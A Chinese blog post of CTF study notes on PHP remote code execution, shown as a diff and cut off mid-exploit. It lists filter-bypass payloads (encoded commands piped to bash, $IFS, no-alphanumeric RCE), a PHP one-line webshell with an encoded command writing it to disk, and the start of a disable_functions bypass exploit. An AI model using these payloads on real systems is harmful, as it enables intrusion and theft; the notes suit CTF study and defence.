@@ -1,0 +1,1025 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="UTF-8" />
+        <title>RCE总结 | 遗世独立の幻想乡</title>
+        <meta name="author" content="CloudFlowing" />
+        <meta name="description" content="" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.org/highlight.js/11.7.0/highlight.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.org/highlight.js/11.7.0/styles/github.min.css"
+/>
+<script src="/blog/js/lib/highlight.js"></script>
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+
+        <!-- 页面点击小红心 -->
+        <script type = "text/javascript" src = "/blog/js/love-click.js"></script>
+        <!-- 浏览器搞笑标题 -->
+        <script type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <div id="layout">
+            <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+            </transition>
+            <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>遗世独立の幻想乡</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;遗世独立の幻想乡</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>RCE总结</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/3/15
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                学习笔记
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Web/" style="color: #00bcd4">Web</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <blockquote>
+<p>解题步骤</p>
+<ol>
+<li><code>phpinfo()</code>查看<code>disable_functions</code>禁用函数</li>
+<li><code>ls</code>查看目录下文件</li>
+<li>执行命令获取flag</li>
+<li>如果是假flag，<code>ls /</code>查看是否存在其他flag文件夹</li>
+</ol>
+</blockquote>
+<hr>
+<h2 id="RCE-命令执行"><a href="#RCE-命令执行" class="headerlink" title="RCE(命令执行)"></a>RCE(命令执行)</h2><span id="more"></span>
+
+<h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><pre><code class="php">assert()    //判断一个表达式是否成立。返回true or false; 
+
+preg_replace()   //函数是用来执行一个正则表达式的搜索和替换的  preg_replace(要搜索的字符串，用于替换的字符串，要搜索替换的字符串)
+</code></pre>
+<ul>
+<li><p><strong>eval()</strong></p>
+<blockquote>
+<p>将输入的字符串参数当做PHP程序代码来执行</p>
+</blockquote>
+<ul>
+<li><pre><code class="php">如果我们通过&lt;?=`ls`;去执行的话需要在前面添加?&gt;
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>**call_user_func()   **</p>
+<blockquote>
+<p>以动态方式调用一个函数，并将一个数组作为参数列表传递给该函数</p>
+</blockquote>
+<pre><code class="php">public function test($test1,$test2) &#123;
+    return $test1 . $test2;
+&#125;
+echo call_user_func(array($this, &#39;test&#39;), &#39;a&#39;, &#39;b&#39;);//输出结果为ab
+
+第一个参数是要调用的函数名或者回调函数，可以是一个字符串（表示函数名），也可以是一个数组（表示对象方法或类静态方法）
+第二个参数是一个数组，包含要传递给函数的参数列表
+</code></pre>
+</li>
+<li><p><strong>call_user_func_array()</strong></p>
+<blockquote>
+<p>把第一个参数作为回调函数进行调用，第二个参数传入数组，将数组中的值作为回调函数的参数</p>
+</blockquote>
+<pre><code class="php">function a($b, $c) &#123;  
+             echo $b; 
+             echo $c; 
+          &#125; 
+          call_user_func_array(&#39;a&#39;, array(&quot;111&quot;, &quot;222&quot;));  //输出 111 222
+</code></pre>
+</li>
+<li><p><strong><a href="#create_function%E5%87%BD%E6%95%B0">create_function()</a></strong></p>
+</li>
+<li><p><strong>array_map()</strong></p>
+<blockquote>
+<p>array_map(引用的函数名称,数组1,可选的数组2)</p>
+</blockquote>
+<pre><code class="php">function myfunction($v1)&#123;
+function oneArray($v)
+&#123;
+    if ($v == &#39;two&#39;) &#123;
+          return &quot;this is two&quot;;
+      &#125;
+    return $v;
+&#125;
+$one_array = [&#39;one&#39;,&#39;two&#39;,&#39;three&#39;];
+print_r(array_map(&#39;oneArray&#39;, $one_array));
+</code></pre>
+</li>
+</ul>
+<h3 id="Linux指令"><a href="#Linux指令" class="headerlink" title="Linux指令"></a><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-command-manual.html">Linux指令</a></h3><ul>
+<li><p>ls：查看目录</p>
+<ul>
+<li>-lst 查看目录下文件权限</li>
+</ul>
+</li>
+<li><p>whoami：返回系统当前用户名</p>
+</li>
+<li><p>pwd：显示当前目录</p>
+</li>
+<li><p><strong>source命令(.)</strong></p>
+<blockquote>
+<p>重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录。因为linux所有的操作都会变成文件的格式存在。</p>
+</blockquote>
+<pre><code class="linux">source filename		# filename必须是可执行的脚本文件
+或者
+. filename			# 注意“.”号后面还有一个空格
+</code></pre>
+</li>
+</ul>
+<h4 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h4><ul>
+<li><p><strong>cat</strong></p>
+<blockquote>
+<p>连接文件并打印到标准输出设备上</p>
+</blockquote>
+<p>读取文件内容，结果不会直接返还，需要查看网页源代码</p>
+</li>
+<li><p>tac&#x2F;head&#x2F;tail&#x2F;more&#x2F;less&#x2F;nl……：等同于cat</p>
+</li>
+<li><p><strong>uniq</strong></p>
+<blockquote>
+<p>检查及删除**文本文件(txt)**中重复出现的行列，一般与 sort 命令结合使用</p>
+</blockquote>
+<p>同样可以输出文件内容</p>
+</li>
+<li><p><strong>tee</strong></p>
+<blockquote>
+<p>读取标准输入的数据，并将其内容输出成文件	</p>
+</blockquote>
+<p>​	<code>command | tee file.txt</code></p>
+</li>
+<li><p><strong>mv</strong></p>
+<blockquote>
+<p>为文件或目录改名、或将文件或目录移入其它位置</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>命令格式</th>
+<th>运行结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>mv source_file(文件) dest_file(文件)</code></td>
+<td>将源文件名 source_file 改为目标文件名 dest_file</td>
+</tr>
+<tr>
+<td><code>mv source_file(文件) dest_directory(目录)</code></td>
+<td>将文件 source_file 移动到目标目录 dest_directory 中</td>
+</tr>
+<tr>
+<td><code>mv source_directory(目录) dest_directory(目录)</code></td>
+<td>目录名 dest_directory 已存在，将 source_directory 移动到目录名 dest_directory 中；目录名 dest_directory 不存在则 source_directory 改名为目录名 dest_directory</td>
+</tr>
+<tr>
+<td><code>mv source_directory(目录) dest_file(文件)</code></td>
+<td>出错</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h4 id="Glob通配符"><a href="#Glob通配符" class="headerlink" title="Glob通配符"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d9633bb74e9a">Glob通配符</a></h4><p><code>*</code>：匹配零个或者多个字符</p>
+<p><code>?</code>：匹配一个字符</p>
+<p><code>[]</code>：匹配指定集合中的任意单个字符，比如<code>[abc]</code>表示匹配单个字符a或者b或者c</p>
+<p><code>&#123;a,b&#125;</code>：匹配a或者b，a与b也是通配符，可以由其他通配符组成</p>
+<p><code>!</code>：表示非，比如<code>!1.txt</code>表示排除文件<code>1.txt</code></p>
+<p><code>[0-9]</code>：匹配单个数字</p>
+<p><code>[[:upper:]]</code>：匹配任意单个大写字母</p>
+<p><code>[[:lower:]]</code>：匹配任意单个小写字母</p>
+<p><code>[[:digit:]]</code>：匹配任意单个数字，等价于<code>[0-9]</code></p>
+<p><code>[[:alpha:]]</code>：匹配任意单个字母，包括大写字母与小写字母</p>
+<p><code>[[:alnum:]]</code>：匹配任意单个字母与数字</p>
+<p><code>[[:space:]]</code>：匹配单个空白字符</p>
+<p><code>[[:punctl:]]</code>：匹配单个标点符号</p>
+<p><code>[^]</code>:匹配指定集合之外的其他任意单个字符，比如<code>[^abc]</code>表示匹配除了a、b、c以外的其他任意字符</p>
+<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><p>使用<code>system</code>前先查看<code>phpinfo</code>中的disabled_functions禁用的函数</p>
+<ul>
+<li><p><strong>system()</strong></p>
+<blockquote>
+<p>直接在终端打印返回结果，成功则返回命令输出的最后一行，失败则返回FALSE</p>
+</blockquote>
+</li>
+<li><p><strong>passthru()</strong></p>
+<blockquote>
+<p>执行外部程序并且显示原始输出，只调用命令，不返回任何结果，但把命令的运行结果原样地直接输出到标准输出设备上</p>
+</blockquote>
+<pre><code class="php">&lt;?php
+     passthru(&quot;ls&quot;);
+?&gt;
+
+执行结果：index.phptest.php
+</code></pre>
+</li>
+<li><p><strong>exec()</strong></p>
+<blockquote>
+<p>执行一个外部程序,命令执行结果的最后一行内容</p>
+</blockquote>
+<pre><code class="php">&lt;?php
+        echo exec(&quot;ls&quot;,$output);
+        echo &quot;&lt;/br&gt;&quot;;
+        print_r($file);
+?&gt;
+
+//$output：数组格式，用于存储输出的信息
+
+
+执行结果：
+test.php
+Array( [0] =&gt; index.php [1] =&gt; test.php)
+</code></pre>
+</li>
+<li><p><strong>pcntl_exec()</strong></p>
+<blockquote>
+<p>在当前进程空间执行指定程序</p>
+</blockquote>
+</li>
+<li><p><strong>shell_exec()</strong></p>
+<blockquote>
+<p>命令执行的输出。如果执行过程中发生错误或者进程不产生输出，则返回NULL。</p>
+</blockquote>
+<pre><code class="php">$result = shell_exec($cmd);
+
+$cmd：shell脚本
+$result：shell脚本的执行结果
+</code></pre>
+</li>
+<li><p><strong>popen()</strong></p>
+<blockquote>
+<p>不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行&#96;</p>
+</blockquote>
+<pre><code class="php">&lt;?php popen( &#39;whoami &gt;&gt; c:/1.txt&#39;, &#39;r&#39; ); ?&gt;
+ 
+&lt;?php  
+    $test = &quot;ls /tmp/test&quot;;  
+    $fp = popen($test,&quot;r&quot;);  //popen打一个进程通道  
+  
+    while (!feof($fp)) &#123;      //从通道里面取得东西  
+        $out = fgets($fp, 4096);  
+         echo  $out;         //打印出来  
+    &#125;  
+    pclose($fp);  
+?&gt; 
+</code></pre>
+</li>
+<li><p>**反引号``**：命令执行，内联执行，`ls`输出查询结果的内容</p>
+<blockquote>
+<p>与shell_exec功能相同，执行shell命令并返回输出的字符串</p>
+</blockquote>
+</li>
+<li><p>**ob_start()**：</p>
+<blockquote>
+<p>打开缓冲区，开始输出缓冲, 这时PHP停止输出, 在这以后的输出都被转到一个内部的缓冲里</p>
+</blockquote>
+</li>
+<li><p><strong>&gt;</strong></p>
+<blockquote>
+<p>重定向符</p>
+</blockquote>
+<pre><code class="php">echo “123” &gt; /home/123.txt
+</code></pre>
+</li>
+<li><p><code>&gt;/dev/null 2&gt;&amp;1</code></p>
+<p>写入的内容会永远消失，也就是不进行回显，需用<code>;</code>号或者<code>||</code>等等一些命令分隔符进行命令分隔</p>
+<ul>
+<li><pre><code>/dev/null
+</code></pre>
+<blockquote>
+<p>将标准输出1重定向到&#x2F;dev&#x2F;null中。 &#x2F;dev&#x2F;null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了&gt;&#x2F;dev&#x2F;null之后，标准输出就会不再存在，没有任何地方能够找到输出的内容</p>
+</blockquote>
+</li>
+<li><pre><code>2&gt;&amp;1
+</code></pre>
+<blockquote>
+<p>2&gt; 表示stderr标准错误</p>
+<p>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1</p>
+<p>1 表示stdout标准输出，系统默认值是1，所以”&gt;&#x2F;dev&#x2F;null”等同于 “1&gt;&#x2F;dev&#x2F;null”</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="C:/Users/Asus/AppData/Roaming/Typora/typora-user-images/image-20230305110214437.png" alt="image-20230305110214437"></p>
+</li>
+<li><p>&amp;：按位与</p>
+</li>
+<li><p>&amp;&amp;：逻辑与</p>
+</li>
+<li><p>|：按位或，直接执行下一条语句</p>
+</li>
+<li><p>||：逻辑或</p>
+</li>
+<li><p>;：在 shell 中，是”连续指令”，执行下一条语句</p>
+</li>
+<li><p>scandir(‘&#x2F;‘)：列出指定路径中的文件和目录</p>
+</li>
+<li><p>file_get_contents(‘&#x2F;flag’)：读取文件</p>
+</li>
+<li><p>find：查找与指定参数条件匹配的文件及目录列表</p>
+<ul>
+<li>-name：按文件名称查找</li>
+</ul>
+</li>
+</ul>
+<h3 id="绕过被过滤的字符"><a href="#绕过被过滤的字符" class="headerlink" title="绕过被过滤的字符"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45927819/article/details/109671655?ops_request_misc=%7B%22request_id%22:%22167003773216782428635305%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167003773216782428635305&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109671655-null-null.142%5Ev67%5Epc_rank_34_queryrelevant25,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=ctf%20%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8Dls%E8%A2%AB%E8%BF%87%E6%BB%A4&spm=1018.2226.3001.4187">绕过被过滤的字符</a></h3><p><strong>下划线</strong>：“+”或“[”或“ ”或“.”</p>
+<p><strong>空格（\x09）</strong>：$IFS$9 、${IFS} 、%09(php环境下)、重定向符&lt;&gt;、&lt;、\x20</p>
+<p><strong>分号</strong>：%0a</p>
+<p><strong>&#x2F;</strong>:chr(47)</p>
+<p><strong>*号</strong>:先获取目标文件名称，然后通过<code>?通配符</code>匹配单个字母，也就是fla?????匹配flag.php(使用<code>&lt;</code>时不能使用<code>?</code>匹配)</p>
+<p>​		使用fla’’g.php</p>
+<p><strong>带参数输入</strong></p>
+<pre><code class="php">?c=eval($_GET[1]);&amp;1=system(&quot;tac%20flag.php&quot;);
+</code></pre>
+<p><strong>文件包含</strong></p>
+<pre><code class="php">eval(include;$_GET[a]?&gt;)&amp;a=伪协议
+</code></pre>
+<p><strong>关键词</strong>：</p>
+<ul>
+<li><p><code>当ls被过滤时： a=l;b=s;$a$b 当cat flag被过滤时： a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125; \#cat test文件内容 a=“ccaatt”;b=$&#123;a:0:1&#125;$&#123;a:2:1&#125;$&#123;a:4:1&#125;;$b test</code></p>
+</li>
+<li><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p><code>echo Y2F0IC9mbGFn|base64 -d|bash ==&gt;cat /flag echo Y2F0IC9mbGFn|base64 -d|sh==&gt;cat /flag echo Y2F0IGZsYWcucGhw|base64 -d|bash==&gt;cat flag.php echo Y2F0IGZsYWcucGhw|base64 -d|sh==&gt;cat flag.php</code></p>
+<h3 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h3><p><code>echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag</code></p>
+<h3 id="oct-x2F-字节"><a href="#oct-x2F-字节" class="headerlink" title="oct&#x2F;字节"></a>oct&#x2F;字节</h3><p><code>$(printf &quot;\154\163&quot;) ==&gt;ls $(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag &#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag</code></p>
+<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>内容为</p>
+<pre><code class="php">&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;
+$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php
+</code></pre>
+</li>
+<li><h3 id="单引号双引号绕过"><a href="#单引号双引号绕过" class="headerlink" title="单引号双引号绕过"></a>单引号双引号绕过</h3><p><code>c&#39;a&#39;t test</code></p>
+<p><code>  c&quot;a&quot;t test</code></p>
+</li>
+<li><h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><p><code>ca\t flag</code></p>
+</li>
+</ul>
+<hr>
+<h3 id="无字母rce"><a href="#无字母rce" class="headerlink" title="无字母rce"></a>无字母rce</h3><blockquote>
+<p>原型：对以下代码的绕过</p>
+</blockquote>
+<pre><code class="php">&lt;?php
+if(!preg_match(&#39;/[a-z0-9]/is&#39;,$_GET[&#39;shell&#39;])) &#123;
+  eval($_GET[&#39;shell&#39;]);
+&#125;
+</code></pre>
+<h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><pre><code class="php">  &lt;?php
+  highlight_file(__FILE__);
+  $code1=&quot;system&quot;;
+  $code2=&quot;cat /f*&quot;;
+  echo &quot;&lt;br&gt;&quot;;
+  echo &quot;?wllm=(~&quot;.urlencode(~$code1).&quot;)(~&quot;.urlencode(~$code2).&quot;);&quot;;
+  ?&gt; 
+</code></pre>
+<ul>
+<li><pre><code class="linux">$(())
+$((~$(())))=-1
+$&#123;_&#125; =&quot;&quot;返回上一次命令
+</code></pre>
+</li>
+</ul>
+<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><pre><code class="python">valid = &quot;1234567890!@$%^*()&#123;&#125;[];\&#39;\&quot;,.&lt;&gt;/?-=_`~ &quot;
+
+answer = str(input(&quot;&quot;))#请输入进行异或构造的字符串
+
+tmp1, tmp2 = &#39;&#39;, &#39;&#39;
+for c in answer:
+  for i in valid:
+    for j in valid:
+      if (ord(i) ^ ord(j) == ord(c)):
+        tmp1 += i
+        tmp2 += j
+        break
+    else:
+      continue
+    break
+print(&quot;tmp1为:&quot;,tmp1)
+print(&quot;tmp2为:&quot;,tmp2)
+</code></pre>
+<h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><ul>
+<li><pre><code class="php">$_++=1
+</code></pre>
+<p><code>$_++</code>对<code>_</code>变量进行了自增操作,由于我们没有定义<code>_</code>的值,PHP会给<code>_</code>赋一个默认值NULL&#x3D;&#x3D;0,</p>
+<p>由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字</p>
+<ul>
+<li>注：linux命令下不能构造<code>($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)</code>类似语句获取数字</li>
+</ul>
+</li>
+<li><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为”Array”</p>
+<pre><code class="php">&quot;A&quot;++ ==&gt; &quot;B&quot;
+&quot;B&quot;++ ==&gt; &quot;C&quot;
+    如果我们能够得到&quot;A&quot;，那么我们就能通过自增自减，得到所有的字母
+    
+$_=[].&#39;&#39;;   //得到&quot;Array&quot;
+$___ = $_[$__];   //得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;
+</code></pre>
+</li>
+</ul>
+<h4 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html"><code>$</code>和<code>_</code>均被过滤的情况</a>(P神文章)</p>
+</blockquote>
+<ul>
+<li><p>使用bin下的base64命令</p>
+<pre><code class="linux">?c=/???/????64 ????????
+</code></pre>
+</li>
+</ul>
+<blockquote>
+<p>临时文件目录：</p>
+<p>Linux临时文件主要存储在&#x2F;tmp&#x2F;目录下，格式通常是（&#x2F;tmp&#x2F;php[6个随机字符]）</p>
+<p>Windows临时文件主要存储在C:&#x2F;Windows&#x2F;目录下，格式通常是（C:&#x2F;Windows&#x2F;php[4个随机字符].tmp）</p>
+<p>大概就是在自己的vps上写一个命令执行的txt，然后在题目post该命令</p>
+</blockquote>
+<ul>
+<li><p>PHP5</p>
+<ul>
+<li><p>要点：</p>
+<ol>
+<li>shell下可以利用<code>.</code>来执行任意脚本</li>
+<li>Linux文件名支持用glob通配符代替</li>
+</ol>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">思路</a>：</p>
+<p>通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在&#x2F;tmp&#x2F;php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）<br>注意：通过.去执行sh命令不需要有执行权限</p>
+</li>
+<li><p>操作：</p>
+<ol>
+<li><p>本地服务器构造POST上传文件数据包</p>
+<pre><code class="php+HTML">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;POST数据包POC&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://7f21b48d-249b-4f0e-8c3e-5be2fae43b59.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;!--链接是当前打开的题目链接--&gt;
+    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+</li>
+<li><p>抓包构造执行命令,在上传文件内容添加sh命令</p>
+<pre><code class="linux">?c=.+/???/????????[@-[]（通配符匹配大写字母）
+</code></pre>
+<pre><code class="linux">文件内容
+#!/bin/sh
+ls
+</code></pre>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h3><p>1.利用dnslog带外</p>
+<p>2.写马</p>
+<p>3.反弹shell</p>
+<p>4.写文件然后访问文件</p>
+<h3 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h3><blockquote>
+<p>依靠传入没有参数的函数套娃就可以达到命令执行的效果</p>
+</blockquote>
+<p>核心</p>
+<pre><code class="php">if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    
+    eval($_GET[&#39;code&#39;]);
+&#125;
+</code></pre>
+<ul>
+<li><p><strong>php函数直接读取文件</strong></p>
+<pre><code class="php">payload例
+    highlight_file(next(array_reverse(scandir(current(localeconv())))));
+</code></pre>
+<ul>
+<li><p><strong>localeconv()函数</strong></p>
+<blockquote>
+<p>返回一包含本地数字及货币格式信息的数组</p>
+</blockquote>
+<p>第一个返回的是点，可利用的点就是代表当前目录，可以结合其他函数进行目录扫描</p>
+</li>
+<li><p><strong>scandir()函数</strong></p>
+<blockquote>
+<p>目录扫描</p>
+</blockquote>
+<pre><code class="php">scandir(current(localeconv()))
+    查看当前目录
+</code></pre>
+</li>
+<li><p><strong>chdir()函数</strong></p>
+<blockquote>
+<p>跳目录</p>
+</blockquote>
+<p>向上跳就要构造chdir(‘…’)</p>
+</li>
+<li><p><strong>array_reverse()函数</strong></p>
+<blockquote>
+<p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个next()</p>
+</blockquote>
+</li>
+<li><p><strong>highlight_file()&#x2F;show_source()函数</strong></p>
+<blockquote>
+<p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p>
+</blockquote>
+<p>被过滤时:print(file_get_contents())</p>
+</li>
+<li><p><strong>next()函数</strong></p>
+<blockquote>
+<p>表示内部指针指向数组的下一个元素，并输出</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>打印时flag被包含可加上<code>base64_encode()</code></p>
+</li>
+</ul>
+<hr>
+<h3 id="突破禁用函数"><a href="#突破禁用函数" class="headerlink" title="突破禁用函数"></a>突破禁用函数</h3><blockquote>
+<p>system() has been disabled for security reasons说明php.ini配置中默认禁用了执行系统外部命令函数,我们可以用php内置函数来读取文件</p>
+</blockquote>
+<h5 id="输出打印"><a href="#输出打印" class="headerlink" title="输出打印:"></a>输出打印:</h5><pre><code class="php">print_r();
+var_dump();
+var_export();
+</code></pre>
+<h5 id="查看目录："><a href="#查看目录：" class="headerlink" title="查看目录："></a>查看目录：</h5><pre><code class="php">scandir(&#39;.&#39;)	//查看当前目录
+glob(&#39;*&#39;)
+scandir(&#39;/&#39;)	//查看根目录
+</code></pre>
+<p><a id="glob://协议"><a target="_blank" rel="noopener" href="https://www.kancloud.cn/a173512/php_note/1709824">glob:&#x2F;&#x2F;伪协议</a></a></p>
+<pre><code class="php">?&gt;&lt;?php
+$it = new DirectoryIterator($_GET[&#39;file&#39;]);
+foreach($it as $f) &#123;
+ printf(&quot;%s&quot;, $f-&gt;getFilename());
+    echo&#39;&lt;/br&gt;&#39;; 
+&#125;
+?&gt;
+    
+    ?&gt; //闭合前面语句
+    查询根目录用 ?file=glob:///*
+
+$a=new DirectoryIterator(&quot;glob:///*&quot;);
+foreach($a as $f)&#123;
+    echo($f-&gt;__toString().&#39; &#39;);
+&#125;exit();
+</code></pre>
+<blockquote>
+<p>查找匹配的文件路径模式</p>
+</blockquote>
+<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件:"></a>读取文件:</h5><pre><code class="php">show_source();
+highlight_file();
+file_get_contents();
+include();
+require();
+
+当前目录直接读取
+根目录下前面加/
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/li_n_k/article/details/128070017">uaf脚本命令执行</a></p>
+<blockquote>
+<p>利用php的垃圾回收的漏洞实现绕过安全目录</p>
+</blockquote>
+<pre><code class="php">c=function ctfshow($cmd) &#123;
+    global $abc, $helper, $backtrace;
+
+    class Vuln &#123;
+        public $a;
+        public function __destruct() &#123;
+            global $backtrace;
+            unset($this-&gt;a);
